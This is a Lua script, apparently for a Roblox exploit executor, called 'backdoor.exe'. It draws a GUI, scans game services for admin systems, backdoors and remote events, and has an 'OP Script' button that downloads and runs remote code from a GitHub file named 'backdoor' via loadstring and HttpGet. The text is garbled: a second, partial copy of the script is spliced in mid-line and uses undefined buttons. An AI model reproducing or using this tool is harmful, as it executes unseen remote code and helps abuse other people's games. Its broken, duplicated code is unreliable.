-- backdoor.exe by Ozil (with draggable UI)

local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "backdoor.exe"

local frame = Instance.new("Frame", gui)
frame.Name = "MainFrame"
frame.Size = UDim2.new(0,400,0,440)
frame.Position = UDim2.new(0.5,-200,0.5,-220)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Text = "🧠 backdoor.exe - Scanner + Executor"
title.Size = UDim2.new(1,0,0,40)
title.Position = UDim2.new(0,0,0,0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Font = Enum.Font.GothamBold
title.TextSize = 20

-- Buttons (Scan, Console, OP Script)
local buttons = { {text="🔍 Scan Game", y=50}, {text="🖥️ Open Console", y=95}, {text="💀 OP Script", y=140} }
local btnInstances = {}
for i, info in ipairs(buttons) do
    local btn = Instance.new("TextButton", frame)
    btn.Text = info.text
    btn.Size = UDim2.new(0.9,0,0,35)
    btn.Position = UDim2.new(0.05,0,0, info.y)
    btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 18
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
    btnInstances[info.text] = btn
end

-- Scroll results
local results = Instance.new("ScrollingFrame", frame)
results.Size = UDim2.new(0.9,0,0,210)
results.Position = UDim2.new(0.05,0,0,185)
results.CanvasSize = UDim2.new(0,0,5,0)
results.ScrollBarThickness = 5
results.BackgroundColor3 = Color3.fromRGB(25,25,25)
results.BorderSizePixel = 0
Instance.new("UICorner", results).CornerRadius = UDim.new(0,6)
local layout = Instance.new("UIListLayout", results)
layout.Padding = UDim.new(0,4)

local function AddResult(text, color)
    local lbl = Instance.new("TextLabel")
    lbl.Text = text
    lbl.Size = UDim2.new(1,-10,0,22)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = color or Color3.fromRGB(255,255,255)
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 15
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = results
end

-- Scan logic
local keywords = {"HDAdmin","Adonis","Kohls","Backdoor","RemoteEvent","RemoteFunction","Script"}
local function deepScan(obj)
    for _, v in pairs(obj:GetDescendants()) do
        for _, word in ipairs(keywords) do
            if string.find(v.Name:lower(), word:lower()) then
                AddResult("⚠️ Found: "..v:GetFullName(), Color3.fromRGB(255,100,100))
            end
        end
    end
end

local function runScan()
    results:ClearAllChildren()
    AddResult("🔎 Scanning...", Color3.fromRGB(150,255,150))
    local services = { game.Workspace, game.Lighting, game.ReplicatedStorage, game.ServerScriptService,
                       game.StarterPlayer, game.StarterGui, game.Players, game.ServerStorage }
    for _, s in ipairs(services) do pcall(function() deepScan(s) end) end
    AddResult("✅ Scan complete!", Color3.fromRGB(100,255,100))
end

btnInstances["🔍 Scan Game"].MouseButton1Click:Connect(runScan)
btnInstances["🖥️ Open Console"].MouseButton1Click:Connect(function()
    game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)
btnInstances["💀 OP Script"].MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
end)

-- Draggable functionality
local UIS = game:GetService("UserInputService")
local dragToggle, dragStart, startPos
local dragSpeed = 0.25

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragToggle = false
            end
        end)
    end
end)

UIS.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragToggle then
        local delta = input.Position - dragStart
        frame:TweenPosition(
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                     startPos.Y.Scale, startPos.Y.Offset + delta.Y),
            "Out", "Quad", dragSpeed, true
        )
    end
end)consoleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
consoleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
consoleBtn.Font = Enum.Font.Gotham
consoleBtn.TextSize = 18
Instance.new("UICorner", consoleBtn).CornerRadius = UDim.new(0, 6)

-- OP Script Button
local opBtn = Instance.new("TextButton", frame)
opBtn.Text = "💀 OP Script"
opBtn.Size = UDim2.new(0.9, 0, 0, 35)
opBtn.Position = UDim2.new(0.05, 0, 0, 140)
opBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
opBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
opBtn.Font = Enum.Font.Gotham
opBtn.TextSize = 18
Instance.new("UICorner", opBtn).CornerRadius = UDim.new(0, 6)

-- Result Output
local results = Instance.new("ScrollingFrame", frame)
results.Size = UDim2.new(0.9, 0, 0, 210)
results.Position = UDim2.new(0.05, 0, 0, 185)
results.CanvasSize = UDim2.new(0, 0, 5, 0)
results.ScrollBarThickness = 5
results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
results.BorderSizePixel = 0
Instance.new("UICorner", results).CornerRadius = UDim.new(0, 6)

local layout = Instance.new("UIListLayout", results)
layout.Padding = UDim.new(0, 4)

-- Add result line
local function AddResult(text, color)
	local lbl = Instance.new("TextLabel")
	lbl.Text = text
	lbl.Size = UDim2.new(1, -10, 0, 22)
	lbl.BackgroundTransparency = 1
	lbl.TextColor3 = color or Color3.fromRGB(255, 255, 255)
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 15
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = results
end

-- Keywords to check for
local keywords = {"HDAdmin", "Adonis", "Kohls", "Backdoor", "RemoteEvent", "RemoteFunction", "Script"}

-- Deep scan
local function deepScan(obj)
	for _, v in pairs(obj:GetDescendants()) do
		for _, word in pairs(keywords) do
			if string.find(v.Name:lower(), word:lower()) then
				AddResult("⚠️ Found: " .. v:GetFullName(), Color3.fromRGB(255, 100, 100))
			end
		end
	end
end

-- Run scan
local function runScan()
	results:ClearAllChildren()
	layout.Parent = results
	AddResult("🔎 Scanning...", Color3.fromRGB(150, 255, 150))

	local services = {
		game.Workspace,
		game.Lighting,
		game.ReplicatedStorage,
		game.ServerScriptService,
		game.StarterPlayer,
		game.StarterGui,
		game.Players,
		game.ServerStorage,
	}

	for _, service in pairs(services) do
		pcall(function()
			deepScan(service)
		end)
	end

	AddResult("✅ Scan complete!", Color3.fromRGB(100, 255, 100))
end

-- Button handlers
scanBtn.MouseButton1Click:Connect(runScan)

consoleBtn.MouseButton1Click:Connect(function()
	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)

opBtn.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
end)
